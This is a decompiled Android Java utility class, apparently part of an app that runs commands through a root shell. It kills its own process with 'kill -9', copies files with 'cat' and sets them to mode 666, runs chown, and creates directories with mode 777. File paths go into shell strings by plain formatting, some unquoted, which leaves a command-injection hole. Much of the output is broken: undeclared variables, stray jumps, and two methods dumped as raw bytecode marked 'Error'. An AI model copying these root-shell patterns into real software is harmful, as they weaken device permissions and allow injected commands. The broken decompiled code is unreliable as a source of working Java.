package com.vvt.shell;

import android.os.Build;
import android.os.Build.VERSION;
import android.os.Process;
import android.os.SystemClock;
import android.util.Log;
import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.Reader;
import java.io.StringReader;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class ShellUtil
{
  private static boolean a = false;
  private static boolean b = false;
  private static final Pattern c = Pattern.compile("^([bcdlsp-][-r][-w][-xsS][-r][-w][-xsS][-r][-w][-xstST])\\s+(\\S+)\\s+(\\S+)\\s+([\\d\\s,]*)\\s+(\\d{4}-\\d\\d-\\d\\d)\\s+(\\d\\d:\\d\\d)\\s+(.*)$");
  
  public static void a()
  {
    int i = 1;
    int j = Process.myPid();
    Process.killProcess(j);
    try
    {
      Object localObject1 = f.a();
      localObject2 = "kill -9 %d";
      boolean bool1 = true;
      localObject3 = new Object[bool1];
      int k = 0;
      localObject4 = null;
      int m = Process.myPid();
      Object localObject5 = Integer.valueOf(m);
      localObject3[0] = localObject5;
      localObject2 = String.format((String)localObject2, (Object[])localObject3);
      localObject2 = ((f)localObject1).a((String)localObject2);
      bool1 = a;
      if (bool1)
      {
        localObject3 = "ShellUtil";
        localObject4 = "killSelf # out %s";
        m = 1;
        localObject5 = new Object[m];
        localObject5[0] = localObject2;
        localObject2 = String.format((String)localObject4, (Object[])localObject5);
        Log.v((String)localObject3, (String)localObject2);
      }
      ((f)localObject1).d();
      localObject1 = "kill -9 %d";
      bool2 = true;
      localObject2 = new Object[bool2];
      bool1 = false;
      localObject3 = null;
      k = Process.myPid();
      localObject4 = Integer.valueOf(k);
      localObject2[0] = localObject4;
      localObject1 = String.format((String)localObject1, (Object[])localObject2);
      localObject1 = KMShell.a((String)localObject1);
      bool2 = a;
      if (bool2)
      {
        localObject2 = "ShellUtil";
        localObject3 = "killSelf # out %s";
        k = 1;
        localObject4 = new Object[k];
        m = 0;
        localObject5 = null;
        localObject4[0] = localObject1;
        localObject1 = String.format((String)localObject3, (Object[])localObject4);
        Log.v((String)localObject2, (String)localObject1);
      }
      return;
    }
    catch (KMShell.ShellException localShellException)
    {
      for (;;)
      {
        Object localObject2;
        Object localObject3;
        Object localObject4;
        boolean bool2 = b;
        if (bool2)
        {
          localObject2 = "ShellUtil";
          localObject3 = "killSelf # Error!! %s";
          localObject4 = new Object[i];
          String str = localShellException.toString();
          localObject4[0] = str;
          str = String.format((String)localObject3, (Object[])localObject4);
          Log.e((String)localObject2, str);
        }
      }
    }
  }
  
  public static void a(String paramString1, String paramString2)
  {
    a(paramString1, paramString2, 1000);
  }
  
  public static void a(String paramString1, String paramString2, int paramInt)
  {
    int i = 2;
    int j = 1;
    int k = 0;
    str1 = null;
    boolean bool2 = a;
    String str2;
    if (bool2)
    {
      str2 = "ShellUtil";
      localObject2 = "copyFile # ENTER ...";
      Log.v(str2, (String)localObject2);
    }
    bool2 = a;
    if (bool2)
    {
      str2 = "ShellUtil";
      localObject3 = new Object[i];
      localObject3[0] = paramString1;
      localObject3[j] = paramString2;
      localObject2 = String.format("copyFile # source: %s, target: %s", (Object[])localObject3);
      Log.v(str2, (String)localObject2);
    }
    localObject2 = null;
    try
    {
      localObject2 = f.b();
      str2 = "cat '%s' > '%s'";
      i = 2;
      localObject3 = new Object[i];
      k = 0;
      str1 = null;
      localObject3[0] = paramString1;
      k = 1;
      localObject3[k] = paramString2;
      str2 = String.format(str2, (Object[])localObject3);
      ((f)localObject2).a(str2);
      long l = paramInt;
      SystemClock.sleep(l);
      str2 = "chmod 666 '%s'";
      i = 1;
      localObject3 = new Object[i];
      k = 0;
      str1 = null;
      localObject3[0] = paramString2;
      str2 = String.format(str2, (Object[])localObject3);
      ((f)localObject2).a(str2);
      if (localObject2 == null) {
        break label201;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool1 = b;
        if (bool1)
        {
          localObject3 = "ShellUtil";
          str1 = "copyFile # Error!!";
          Log.e((String)localObject3, str1, localException);
        }
        if (localObject2 == null) {}
      }
    }
    finally
    {
      if (localObject2 == null) {
        break label276;
      }
      ((f)localObject2).d();
    }
    ((f)localObject2).d();
    label201:
    bool2 = a;
    if (bool2)
    {
      str2 = "ShellUtil";
      localObject2 = "copyFile # EXIT ...";
      Log.v(str2, (String)localObject2);
    }
  }
  
  public static void a(String paramString1, String paramString2, ArrayList paramArrayList)
  {
    int i = 2;
    int j = 1;
    int k = 0;
    boolean bool2 = a;
    Object localObject1;
    if (bool2)
    {
      localObject1 = "ShellUtil";
      localObject3 = "copyFile # ENTER ...";
      Log.v((String)localObject1, (String)localObject3);
    }
    bool2 = a;
    Object localObject4;
    if (bool2)
    {
      localObject1 = "ShellUtil";
      localObject4 = new Object[i];
      localObject4[0] = paramString1;
      localObject4[j] = paramString2;
      localObject3 = String.format("copyFile # source: %s, target: %s", (Object[])localObject4);
      Log.v((String)localObject1, (String)localObject3);
    }
    bool2 = a;
    Object localObject5;
    Object[] arrayOfObject;
    if (bool2)
    {
      localObject1 = "ShellUtil";
      localObject4 = new Object[j];
      int m = paramArrayList.size();
      localObject5 = Integer.valueOf(m);
      localObject4[0] = localObject5;
      localObject3 = String.format("copyFile # data (%d):-", (Object[])localObject4);
      Log.v((String)localObject1, (String)localObject3);
      localObject3 = paramArrayList.iterator();
      for (;;)
      {
        bool2 = ((Iterator)localObject3).hasNext();
        if (!bool2) {
          break;
        }
        localObject1 = (String)((Iterator)localObject3).next();
        localObject4 = "ShellUtil";
        localObject5 = "copyFile # >> %s";
        arrayOfObject = new Object[j];
        arrayOfObject[0] = localObject1;
        localObject1 = String.format((String)localObject5, arrayOfObject);
        Log.v((String)localObject4, (String)localObject1);
      }
    }
    Object localObject3 = null;
    for (;;)
    {
      try
      {
        localObject1 = new java/io/File;
        ((File)localObject1).<init>(paramString2);
        bool2 = ((File)localObject1).exists();
        if (!bool2)
        {
          bool2 = false;
          localObject1 = null;
          a(paramString2, false);
        }
        localObject3 = f.b();
        localObject4 = paramArrayList.iterator();
        bool2 = ((Iterator)localObject4).hasNext();
        if (bool2)
        {
          localObject1 = ((Iterator)localObject4).next();
          localObject1 = (String)localObject1;
          localObject5 = "cat %s/%s > %s/%s";
          int n = 4;
          arrayOfObject = new Object[n];
          k = 0;
          arrayOfObject[0] = paramString1;
          k = 1;
          arrayOfObject[k] = localObject1;
          k = 2;
          arrayOfObject[k] = paramString2;
          k = 3;
          arrayOfObject[k] = localObject1;
          localObject5 = String.format((String)localObject5, arrayOfObject);
          ((f)localObject3).a((String)localObject5);
          long l = 1000L;
          SystemClock.sleep(l);
          localObject5 = "chmod 666 %s/%s";
          n = 2;
          arrayOfObject = new Object[n];
          k = 0;
          arrayOfObject[0] = paramString2;
          k = 1;
          arrayOfObject[k] = localObject1;
          localObject1 = String.format((String)localObject5, arrayOfObject);
          ((f)localObject3).a((String)localObject1);
        }
        else
        {
          boolean bool1;
          String str;
          if (localObject3 == null) {}
        }
      }
      catch (Exception localException)
      {
        bool1 = b;
        if (bool1)
        {
          localObject4 = "ShellUtil";
          localObject5 = "copyFile # Error!!";
          Log.e((String)localObject4, (String)localObject5, localException);
        }
        if (localObject3 != null) {
          ((f)localObject3).d();
        }
        bool2 = a;
        if (bool2)
        {
          str = "ShellUtil";
          localObject3 = "copyFile # EXIT ...";
          Log.v(str, (String)localObject3);
        }
        return;
      }
      finally
      {
        if (localObject3 != null) {
          ((f)localObject3).d();
        }
      }
    }
  }
  
  public static void a(String paramString1, String paramString2, boolean paramBoolean)
  {
    boolean bool1 = a;
    String str1;
    Object localObject2;
    if (bool1)
    {
      str1 = "ShellUtil";
      localObject2 = "chown # START ...";
      Log.v(str1, (String)localObject2);
    }
    if (paramBoolean) {
      b(paramString1, paramString2);
    }
    for (;;)
    {
      bool1 = a;
      if (bool1)
      {
        str1 = "ShellUtil";
        localObject2 = "chown # EXIT ...";
        Log.v(str1, (String)localObject2);
      }
      return;
      localObject2 = null;
      try
      {
        localObject2 = f.b();
        str1 = "chown %s.%s %s";
        int i = 3;
        localObject3 = new Object[i];
        int j = 0;
        str2 = null;
        localObject3[0] = paramString1;
        j = 1;
        localObject3[j] = paramString1;
        j = 2;
        localObject3[j] = paramString2;
        str1 = String.format(str1, (Object[])localObject3);
        ((f)localObject2).a(str1);
        if (localObject2 == null) {
          continue;
        }
        ((f)localObject2).d();
      }
      finally
      {
        try
        {
          for (;;)
          {
            Object localObject3;
            String str2;
            boolean bool2 = b;
            if (bool2)
            {
              localObject3 = "ShellUtil";
              str2 = "chown # err ...";
              Log.e((String)localObject3, str2, localThrowable);
            }
            if (localObject2 == null) {
              break;
            }
          }
        }
        finally
        {
          if (localObject2 != null) {
            ((f)localObject2).d();
          }
        }
      }
    }
  }
  
  public static void a(String paramString, boolean paramBoolean)
  {
    int i = 1;
    Object localObject1 = "/";
    String[] arrayOfString = paramString.split((String)localObject1);
    int j = 0;
    Object localObject2 = null;
    int k;
    if (paramBoolean)
    {
      localObject1 = f.b();
      k = 0;
    }
    for (;;)
    {
      int m = arrayOfString.length;
      if (k >= m) {
        break label261;
      }
      j = paramString.length();
      if (j > 0)
      {
        j = paramString.charAt(0);
        m = 47;
        if (j != m) {}
      }
      for (localObject2 = "/";; localObject2 = "")
      {
        localObject3 = arrayOfString[k];
        if (localObject3 == null) {
          break label252;
        }
        m = ((String)localObject3).length();
        if (m <= 0) {
          break label252;
        }
        m = 0;
        localObject3 = null;
        while (m <= k)
        {
          localObject4 = arrayOfString[m];
          if (localObject4 != null)
          {
            localObject4 = arrayOfString[m];
            int n = ((String)localObject4).length();
            if (n > 0)
            {
              localObject4 = new java/lang/StringBuilder;
              ((StringBuilder)localObject4).<init>();
              localObject2 = ((StringBuilder)localObject4).append((String)localObject2);
              Object[] arrayOfObject = new Object[i];
              String str = arrayOfString[m];
              arrayOfObject[0] = str;
              localObject4 = String.format("%s/", arrayOfObject);
              localObject2 = (String)localObject4;
            }
          }
          m += 1;
        }
        localObject1 = f.a();
        break;
      }
      Object localObject4 = new Object[i];
      localObject4[0] = localObject2;
      localObject3 = String.format("mkdir %s", (Object[])localObject4);
      ((f)localObject1).a((String)localObject3);
      label252:
      k += 1;
    }
    label261:
    Object localObject3 = new Object[i];
    localObject3[0] = localObject2;
    localObject2 = String.format("chmod 777 %s", (Object[])localObject3);
    ((f)localObject1).a((String)localObject2);
    ((f)localObject1).d();
  }
  
  /* Error */
  public static void a(boolean paramBoolean)
  {
    // Byte code:
    //   0: iconst_0
    //   1: istore_1
    //   2: aconst_null
    //   3: astore_2
    //   4: iconst_2
    //   5: istore_3
    //   6: invokestatic 95	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   9: astore 4
    //   11: ldc -53
    //   13: astore 5
    //   15: aload 4
    //   17: aload 5
    //   19: invokevirtual 56	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   22: astore 5
    //   24: aload 5
    //   26: ifnull +219 -> 245
    //   29: new 205	java/io/BufferedReader
    //   32: astore 6
    //   34: new 207	java/io/StringReader
    //   37: astore 7
    //   39: aload 7
    //   41: aload 5
    //   43: invokespecial 208	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   46: sipush 256
    //   49: istore 8
    //   51: aload 6
    //   53: aload 7
    //   55: iload 8
    //   57: invokespecial 212	java/io/BufferedReader:<init>	(Ljava/io/Reader;I)V
    //   60: aload 6
    //   62: invokevirtual 215	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   65: astore 5
    //   67: aload 5
    //   69: ifnull +21 -> 90
    //   72: ldc -39
    //   74: astore 7
    //   76: aload 5
    //   78: aload 7
    //   80: invokevirtual 221	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   83: istore 9
    //   85: iload 9
    //   87: ifeq -27 -> 60
    //   90: aload 5
    //   92: ifnull +148 -> 240
    //   95: ldc -33
    //   97: astore 7
    //   99: aload 5
    //   101: aload 7
    //   103: invokevirtual 176	java/lang/String:split	(Ljava/lang/String;)[Ljava/lang/String;
    //   106: astore 7
    //   108: aload 7
    //   110: ifnull +130 -> 240
    //   113: aload 7
    //   115: arraylength
    //   116: istore 8
    //   118: iload 8
    //   120: iload_3
    //   121: if_icmple +119 -> 240
    //   124: ldc -31
    //   126: astore_2
    //   127: iconst_5
    //   128: istore 8
    //   130: iload 8
    //   132: anewarray 4	java/lang/Object
    //   135: astore 10
    //   137: iconst_0
    //   138: istore 8
    //   140: aconst_null
    //   141: astore 5
    //   143: ldc -53
    //   145: astore 11
    //   147: aload 10
    //   149: iconst_0
    //   150: aload 11
    //   152: aastore
    //   153: iconst_1
    //   154: istore 12
    //   156: iload_0
    //   157: ifeq +226 -> 383
    //   160: ldc -28
    //   162: astore 5
    //   164: aload 10
    //   166: iload 12
    //   168: aload 5
    //   170: aastore
    //   171: iconst_2
    //   172: istore 8
    //   174: iconst_2
    //   175: istore 12
    //   177: aload 7
    //   179: iload 12
    //   181: aaload
    //   182: astore 11
    //   184: aload 10
    //   186: iload 8
    //   188: aload 11
    //   190: aastore
    //   191: iconst_3
    //   192: istore 8
    //   194: iconst_0
    //   195: istore 12
    //   197: aconst_null
    //   198: astore 11
    //   200: aload 7
    //   202: iconst_0
    //   203: aaload
    //   204: astore 11
    //   206: aload 10
    //   208: iload 8
    //   210: aload 11
    //   212: aastore
    //   213: iconst_4
    //   214: istore 8
    //   216: iconst_1
    //   217: istore 12
    //   219: aload 7
    //   221: iload 12
    //   223: aaload
    //   224: astore 7
    //   226: aload 10
    //   228: iload 8
    //   230: aload 7
    //   232: aastore
    //   233: aload_2
    //   234: aload 10
    //   236: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   239: astore_2
    //   240: aload 6
    //   242: invokevirtual 231	java/io/BufferedReader:close	()V
    //   245: getstatic 11	com/vvt/shell/ShellUtil:a	Z
    //   248: istore 8
    //   250: iload 8
    //   252: ifeq +48 -> 300
    //   255: ldc 58
    //   257: astore 5
    //   259: ldc -23
    //   261: astore 6
    //   263: iconst_1
    //   264: istore 9
    //   266: iload 9
    //   268: anewarray 4	java/lang/Object
    //   271: astore 7
    //   273: iconst_0
    //   274: istore_3
    //   275: aconst_null
    //   276: astore 10
    //   278: aload 7
    //   280: iconst_0
    //   281: aload_2
    //   282: aastore
    //   283: aload 6
    //   285: aload 7
    //   287: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   290: astore 6
    //   292: aload 5
    //   294: aload 6
    //   296: invokestatic 66	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   299: pop
    //   300: aload_2
    //   301: ifnull +71 -> 372
    //   304: aload 4
    //   306: aload_2
    //   307: invokevirtual 56	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   310: astore 5
    //   312: aload 5
    //   314: ifnull +28 -> 342
    //   317: aload 5
    //   319: invokevirtual 236	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   322: astore 6
    //   324: ldc -18
    //   326: astore 7
    //   328: aload 6
    //   330: aload 7
    //   332: invokevirtual 221	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   335: istore 13
    //   337: iload 13
    //   339: ifne +28 -> 367
    //   342: aload 5
    //   344: invokevirtual 236	java/lang/String:toLowerCase	()Ljava/lang/String;
    //   347: astore 5
    //   349: ldc -16
    //   351: astore 6
    //   353: aload 5
    //   355: aload 6
    //   357: invokevirtual 221	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   360: istore 8
    //   362: iload 8
    //   364: ifeq +8 -> 372
    //   367: aload_2
    //   368: invokestatic 73	com/vvt/shell/KMShell:a	(Ljava/lang/String;)Ljava/lang/String;
    //   371: pop
    //   372: aload 4
    //   374: ifnull +8 -> 382
    //   377: aload 4
    //   379: invokevirtual 70	com/vvt/shell/f:d	()V
    //   382: return
    //   383: ldc -14
    //   385: astore 5
    //   387: goto -223 -> 164
    //   390: astore 5
    //   392: aconst_null
    //   393: astore 4
    //   395: getstatic 11	com/vvt/shell/ShellUtil:a	Z
    //   398: istore_1
    //   399: iload_1
    //   400: ifeq +54 -> 454
    //   403: ldc 58
    //   405: astore_2
    //   406: ldc -12
    //   408: astore 6
    //   410: iconst_1
    //   411: istore 9
    //   413: iload 9
    //   415: anewarray 4	java/lang/Object
    //   418: astore 7
    //   420: iconst_0
    //   421: istore_3
    //   422: aconst_null
    //   423: astore 10
    //   425: aload 5
    //   427: invokevirtual 247	com/vvt/shell/CannotGetRootShellException:toString	()Ljava/lang/String;
    //   430: astore 5
    //   432: aload 7
    //   434: iconst_0
    //   435: aload 5
    //   437: aastore
    //   438: aload 6
    //   440: aload 7
    //   442: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   445: astore 5
    //   447: aload_2
    //   448: aload 5
    //   450: invokestatic 84	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;)I
    //   453: pop
    //   454: aload 4
    //   456: ifnull -74 -> 382
    //   459: goto -82 -> 377
    //   462: astore 5
    //   464: aconst_null
    //   465: astore 4
    //   467: getstatic 11	com/vvt/shell/ShellUtil:a	Z
    //   470: istore_1
    //   471: iload_1
    //   472: ifeq +54 -> 526
    //   475: ldc 58
    //   477: astore_2
    //   478: ldc -12
    //   480: astore 6
    //   482: iconst_1
    //   483: istore 9
    //   485: iload 9
    //   487: anewarray 4	java/lang/Object
    //   490: astore 7
    //   492: iconst_0
    //   493: istore_3
    //   494: aconst_null
    //   495: astore 10
    //   497: aload 5
    //   499: invokevirtual 81	com/vvt/shell/KMShell$ShellException:toString	()Ljava/lang/String;
    //   502: astore 5
    //   504: aload 7
    //   506: iconst_0
    //   507: aload 5
    //   509: aastore
    //   510: aload 6
    //   512: aload 7
    //   514: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   517: astore 5
    //   519: aload_2
    //   520: aload 5
    //   522: invokestatic 84	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;)I
    //   525: pop
    //   526: aload 4
    //   528: ifnull -146 -> 382
    //   531: goto -154 -> 377
    //   534: astore 5
    //   536: aconst_null
    //   537: astore 4
    //   539: aload 4
    //   541: ifnull +8 -> 549
    //   544: aload 4
    //   546: invokevirtual 70	com/vvt/shell/f:d	()V
    //   549: aload 5
    //   551: athrow
    //   552: astore 5
    //   554: aconst_null
    //   555: astore 4
    //   557: aload 4
    //   559: ifnull -177 -> 382
    //   562: goto -185 -> 377
    //   565: astore 5
    //   567: goto -28 -> 539
    //   570: astore 5
    //   572: goto -105 -> 467
    //   575: astore 5
    //   577: goto -20 -> 557
    //   580: astore 5
    //   582: goto -187 -> 395
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	585	0	paramBoolean	boolean
    //   1	471	1	bool1	boolean
    //   3	517	2	str1	String
    //   5	489	3	i	int
    //   9	549	4	localf	f
    //   13	373	5	str2	String
    //   390	36	5	localCannotGetRootShellException1	CannotGetRootShellException
    //   430	19	5	str3	String
    //   462	36	5	localShellException1	KMShell.ShellException
    //   502	19	5	str4	String
    //   534	16	5	localObject1	Object
    //   552	1	5	localIOException1	IOException
    //   565	1	5	localObject2	Object
    //   570	1	5	localShellException2	KMShell.ShellException
    //   575	1	5	localIOException2	IOException
    //   580	1	5	localCannotGetRootShellException2	CannotGetRootShellException
    //   32	479	6	localObject3	Object
    //   37	476	7	localObject4	Object
    //   49	180	8	j	int
    //   248	115	8	bool2	boolean
    //   83	403	9	bool3	boolean
    //   135	361	10	arrayOfObject	Object[]
    //   145	66	11	str5	String
    //   154	68	12	k	int
    //   335	3	13	bool4	boolean
    // Exception table:
    //   from	to	target	type
    //   6	9	390	com/vvt/shell/CannotGetRootShellException
    //   6	9	462	com/vvt/shell/KMShell$ShellException
    //   6	9	534	finally
    //   6	9	552	java/io/IOException
    //   17	22	565	finally
    //   29	32	565	finally
    //   34	37	565	finally
    //   41	46	565	finally
    //   55	60	565	finally
    //   60	65	565	finally
    //   78	83	565	finally
    //   101	106	565	finally
    //   113	116	565	finally
    //   130	135	565	finally
    //   150	153	565	finally
    //   168	171	565	finally
    //   179	182	565	finally
    //   188	191	565	finally
    //   202	204	565	finally
    //   210	213	565	finally
    //   221	224	565	finally
    //   230	233	565	finally
    //   234	239	565	finally
    //   240	245	565	finally
    //   245	248	565	finally
    //   266	271	565	finally
    //   281	283	565	finally
    //   285	290	565	finally
    //   294	300	565	finally
    //   306	310	565	finally
    //   317	322	565	finally
    //   330	335	565	finally
    //   342	347	565	finally
    //   355	360	565	finally
    //   367	372	565	finally
    //   395	398	565	finally
    //   413	418	565	finally
    //   425	430	565	finally
    //   435	438	565	finally
    //   440	445	565	finally
    //   448	454	565	finally
    //   467	470	565	finally
    //   485	490	565	finally
    //   497	502	565	finally
    //   507	510	565	finally
    //   512	517	565	finally
    //   520	526	565	finally
    //   17	22	570	com/vvt/shell/KMShell$ShellException
    //   29	32	570	com/vvt/shell/KMShell$ShellException
    //   34	37	570	com/vvt/shell/KMShell$ShellException
    //   41	46	570	com/vvt/shell/KMShell$ShellException
    //   55	60	570	com/vvt/shell/KMShell$ShellException
    //   60	65	570	com/vvt/shell/KMShell$ShellException
    //   78	83	570	com/vvt/shell/KMShell$ShellException
    //   101	106	570	com/vvt/shell/KMShell$ShellException
    //   113	116	570	com/vvt/shell/KMShell$ShellException
    //   130	135	570	com/vvt/shell/KMShell$ShellException
    //   150	153	570	com/vvt/shell/KMShell$ShellException
    //   168	171	570	com/vvt/shell/KMShell$ShellException
    //   179	182	570	com/vvt/shell/KMShell$ShellException
    //   188	191	570	com/vvt/shell/KMShell$ShellException
    //   202	204	570	com/vvt/shell/KMShell$ShellException
    //   210	213	570	com/vvt/shell/KMShell$ShellException
    //   221	224	570	com/vvt/shell/KMShell$ShellException
    //   230	233	570	com/vvt/shell/KMShell$ShellException
    //   234	239	570	com/vvt/shell/KMShell$ShellException
    //   240	245	570	com/vvt/shell/KMShell$ShellException
    //   245	248	570	com/vvt/shell/KMShell$ShellException
    //   266	271	570	com/vvt/shell/KMShell$ShellException
    //   281	283	570	com/vvt/shell/KMShell$ShellException
    //   285	290	570	com/vvt/shell/KMShell$ShellException
    //   294	300	570	com/vvt/shell/KMShell$ShellException
    //   306	310	570	com/vvt/shell/KMShell$ShellException
    //   317	322	570	com/vvt/shell/KMShell$ShellException
    //   330	335	570	com/vvt/shell/KMShell$ShellException
    //   342	347	570	com/vvt/shell/KMShell$ShellException
    //   355	360	570	com/vvt/shell/KMShell$ShellException
    //   367	372	570	com/vvt/shell/KMShell$ShellException
    //   17	22	575	java/io/IOException
    //   29	32	575	java/io/IOException
    //   34	37	575	java/io/IOException
    //   41	46	575	java/io/IOException
    //   55	60	575	java/io/IOException
    //   60	65	575	java/io/IOException
    //   78	83	575	java/io/IOException
    //   101	106	575	java/io/IOException
    //   113	116	575	java/io/IOException
    //   130	135	575	java/io/IOException
    //   150	153	575	java/io/IOException
    //   168	171	575	java/io/IOException
    //   179	182	575	java/io/IOException
    //   188	191	575	java/io/IOException
    //   202	204	575	java/io/IOException
    //   210	213	575	java/io/IOException
    //   221	224	575	java/io/IOException
    //   230	233	575	java/io/IOException
    //   234	239	575	java/io/IOException
    //   240	245	575	java/io/IOException
    //   245	248	575	java/io/IOException
    //   266	271	575	java/io/IOException
    //   281	283	575	java/io/IOException
    //   285	290	575	java/io/IOException
    //   294	300	575	java/io/IOException
    //   306	310	575	java/io/IOException
    //   317	322	575	java/io/IOException
    //   330	335	575	java/io/IOException
    //   342	347	575	java/io/IOException
    //   355	360	575	java/io/IOException
    //   367	372	575	java/io/IOException
    //   17	22	580	com/vvt/shell/CannotGetRootShellException
    //   29	32	580	com/vvt/shell/CannotGetRootShellException
    //   34	37	580	com/vvt/shell/CannotGetRootShellException
    //   41	46	580	com/vvt/shell/CannotGetRootShellException
    //   55	60	580	com/vvt/shell/CannotGetRootShellException
    //   60	65	580	com/vvt/shell/CannotGetRootShellException
    //   78	83	580	com/vvt/shell/CannotGetRootShellException
    //   101	106	580	com/vvt/shell/CannotGetRootShellException
    //   113	116	580	com/vvt/shell/CannotGetRootShellException
    //   130	135	580	com/vvt/shell/CannotGetRootShellException
    //   150	153	580	com/vvt/shell/CannotGetRootShellException
    //   168	171	580	com/vvt/shell/CannotGetRootShellException
    //   179	182	580	com/vvt/shell/CannotGetRootShellException
    //   188	191	580	com/vvt/shell/CannotGetRootShellException
    //   202	204	580	com/vvt/shell/CannotGetRootShellException
    //   210	213	580	com/vvt/shell/CannotGetRootShellException
    //   221	224	580	com/vvt/shell/CannotGetRootShellException
    //   230	233	580	com/vvt/shell/CannotGetRootShellException
    //   234	239	580	com/vvt/shell/CannotGetRootShellException
    //   240	245	580	com/vvt/shell/CannotGetRootShellException
    //   245	248	580	com/vvt/shell/CannotGetRootShellException
    //   266	271	580	com/vvt/shell/CannotGetRootShellException
    //   281	283	580	com/vvt/shell/CannotGetRootShellException
    //   285	290	580	com/vvt/shell/CannotGetRootShellException
    //   294	300	580	com/vvt/shell/CannotGetRootShellException
    //   306	310	580	com/vvt/shell/CannotGetRootShellException
    //   317	322	580	com/vvt/shell/CannotGetRootShellException
    //   330	335	580	com/vvt/shell/CannotGetRootShellException
    //   342	347	580	com/vvt/shell/CannotGetRootShellException
    //   355	360	580	com/vvt/shell/CannotGetRootShellException
    //   367	372	580	com/vvt/shell/CannotGetRootShellException
  }
  
  /* Error */
  public static boolean a(String paramString)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_1
    //   2: getstatic 11	com/vvt/shell/ShellUtil:a	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +17 -> 24
    //   10: ldc 58
    //   12: astore_3
    //   13: ldc -5
    //   15: astore 4
    //   17: aload_3
    //   18: aload 4
    //   20: invokestatic 66	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   23: pop
    //   24: invokestatic 253	com/vvt/shell/ShellUtil:removeFromPath	()Ljava/lang/String;
    //   27: astore_3
    //   28: new 207	java/io/StringReader
    //   31: astore 4
    //   33: aload 4
    //   35: aload_3
    //   36: invokespecial 208	java/io/StringReader:<init>	(Ljava/lang/String;)V
    //   39: new 205	java/io/BufferedReader
    //   42: astore 5
    //   44: aload 5
    //   46: aload 4
    //   48: invokespecial 256	java/io/BufferedReader:<init>	(Ljava/io/Reader;)V
    //   51: aload 5
    //   53: invokevirtual 215	java/io/BufferedReader:readLine	()Ljava/lang/String;
    //   56: astore_3
    //   57: aload_3
    //   58: ifnull +178 -> 236
    //   61: aload_3
    //   62: aload_0
    //   63: invokevirtual 221	java/lang/String:contains	(Ljava/lang/CharSequence;)Z
    //   66: istore_2
    //   67: iload_2
    //   68: ifeq -17 -> 51
    //   71: getstatic 11	com/vvt/shell/ShellUtil:a	Z
    //   74: istore_2
    //   75: iload_2
    //   76: ifeq +42 -> 118
    //   79: ldc 58
    //   81: astore_3
    //   82: ldc_w 258
    //   85: astore 6
    //   87: iconst_1
    //   88: istore 7
    //   90: iload 7
    //   92: anewarray 4	java/lang/Object
    //   95: astore 8
    //   97: aload 8
    //   99: iconst_0
    //   100: aload_0
    //   101: aastore
    //   102: aload 6
    //   104: aload 8
    //   106: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   109: astore 6
    //   111: aload_3
    //   112: aload 6
    //   114: invokestatic 66	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   117: pop
    //   118: aload 4
    //   120: invokevirtual 259	java/io/StringReader:close	()V
    //   123: aload 5
    //   125: invokevirtual 231	java/io/BufferedReader:close	()V
    //   128: iload_1
    //   129: ireturn
    //   130: astore_3
    //   131: getstatic 11	com/vvt/shell/ShellUtil:a	Z
    //   134: istore 9
    //   136: iload 9
    //   138: ifeq +22 -> 160
    //   141: ldc 58
    //   143: astore 6
    //   145: aload_3
    //   146: invokevirtual 262	java/io/IOException:getMessage	()Ljava/lang/String;
    //   149: astore 8
    //   151: aload 6
    //   153: aload 8
    //   155: aload_3
    //   156: invokestatic 112	android/util/Log:e	(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    //   159: pop
    //   160: aload 4
    //   162: invokevirtual 259	java/io/StringReader:close	()V
    //   165: aload 5
    //   167: invokevirtual 231	java/io/BufferedReader:close	()V
    //   170: getstatic 11	com/vvt/shell/ShellUtil:a	Z
    //   173: istore_2
    //   174: iload_2
    //   175: ifeq +38 -> 213
    //   178: ldc 58
    //   180: astore_3
    //   181: ldc_w 264
    //   184: astore 4
    //   186: iload_1
    //   187: anewarray 4	java/lang/Object
    //   190: astore 10
    //   192: aload 10
    //   194: iconst_0
    //   195: aload_0
    //   196: aastore
    //   197: aload 4
    //   199: aload 10
    //   201: invokestatic 53	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   204: astore 10
    //   206: aload_3
    //   207: aload 10
    //   209: invokestatic 66	android/util/Log:v	(Ljava/lang/String;Ljava/lang/String;)I
    //   212: pop
    //   213: iconst_0
    //   214: istore_1
    //   215: aconst_null
    //   216: astore 10
    //   218: goto -90 -> 128
    //   221: astore 10
    //   223: aload 4
    //   225: invokevirtual 259	java/io/StringReader:close	()V
    //   228: aload 5
    //   230: invokevirtual 231	java/io/BufferedReader:close	()V
    //   233: aload 10
    //   235: athrow
    //   236: aload 4
    //   238: invokevirtual 259	java/io/StringReader:close	()V
    //   241: aload 5
    //   243: invokevirtual 231	java/io/BufferedReader:close	()V
    //   246: goto -76 -> 170
    //   249: astore_3
    //   250: goto -80 -> 170
